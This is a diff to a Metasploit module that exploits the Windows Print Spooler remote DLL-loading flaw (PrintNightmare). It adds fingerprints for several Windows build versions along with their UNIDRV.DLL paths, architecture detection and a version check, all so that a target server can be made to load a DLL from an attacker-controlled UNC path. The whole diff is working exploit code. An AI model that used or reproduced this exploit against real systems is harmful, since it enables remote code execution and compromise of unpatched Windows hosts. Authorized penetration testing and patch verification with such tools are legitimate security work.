@@ -117,6 +117,15 @@ class MetasploitModule < Msf::Auxiliary
   CheckCode = Exploit::CheckCode
   # PrintSystem = RubySMB::Dcerpc::PrintSystem
 
+  Target = Struct.new(:version, :arch, :driver_path)
+
+  TARGETS = [ # need to be in descending order by version number
+    Target.new('10.0.19041', ARCH_X64, 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_c62e9f8067f98247\\Amd64\\UNIDRV.DLL'),
+    Target.new('10.0.18362', ARCH_X64, 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_ce3301b66255a0fb\\Amd64\\UNIDRV.DLL'),
+    Target.new('10.0.17763', ARCH_X64, 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL'),
+    Target.new('10.0.14393', ARCH_X64, 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_dcef07064d319714\\Amd64\\UNIDRV.DLL'),
+  ].freeze
+
   def initialize(info = {})
     super(
       update_info(
@@ -158,7 +167,13 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptPort.new('RPORT', [ false, 'The netlogon RPC port' ]),
-        OptString.new('UNC_PATH', [ true, 'The UNC path the the DLL that the server should load' ])
+        OptString.new('UNC_PATH', [ true, 'The UNC path the the DLL that the server should load' ]),
+      ]
+    )
+
+    register_advanced_options(
+      [
+        OptString.new('UnidrvPath', [ false, 'The path on the remote system to UNIDRV.DLL' ])
       ]
     )
   end
@@ -177,7 +192,26 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     arch = dcerpc_getarch
-    print_status("Targeting Windows v#{simple.client.os_version} (#{arch})")
+    print_status("Target environment: Windows v#{simple.client.os_version} (#{arch})")
+
+    # see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/e81cbc09-ab05-4a32-ae4a-8ec57b436c43
+    if arch == ARCH_X64
+      environment = 'Windows x64'
+    elsif arch == ARCH_X86
+      environment = 'Windows NT x86'
+    else
+      fail_with(Failure::NoTarget, 'Only x86 and x64 targets are supported')
+    end
+
+    target_os_version = Rex::Version.new(simple.client.os_version)
+    fail_with(Failure::NotVulnerable, 'The target is not vulnerable.') if target_os_version > Rex::Version.new('10.0.19043')
+
+    driver_path = datastore['UnidrvPath']
+    if driver_path.blank?
+      target = TARGETS.find { |t| t.arch == arch && Rex::Version.new(t.version) <= target_os_version }
+      fail_with(Failure::NoTarget, 'No fingerprint matched the target. Set the UnidrvPath if it is known.') if target.nil?
+      driver_path = target.driver_path
+    end
 
     handle = dcerpc_handle(PrintSystem::UUID, '1.0', 'ncacn_np', ['\\spoolss'])
     vprint_status("Binding to #{handle} ...")
@@ -203,8 +237,8 @@ class MetasploitModule < Msf::Auxiliary
         p_config_file_ref_id: 0x00020010,
         # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/4464eaf0-f34f-40d5-b970-736437a21913
         p_name: "#{Rex::Text.rand_text_alpha_upper(2..4)} #{Rex::Text.rand_text_numeric(2..3)}",
-        p_environment: 'Windows x64',
-        p_driver_path: 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_dcef07064d319714\\Amd64\\UNIDRV.DLL',
+        p_environment: environment,
+        p_driver_path: driver_path,
         p_data_file: datastore['UNC_PATH'],
         p_config_file: 'C:\\Windows\\System32\\kernel32.dll'
       )
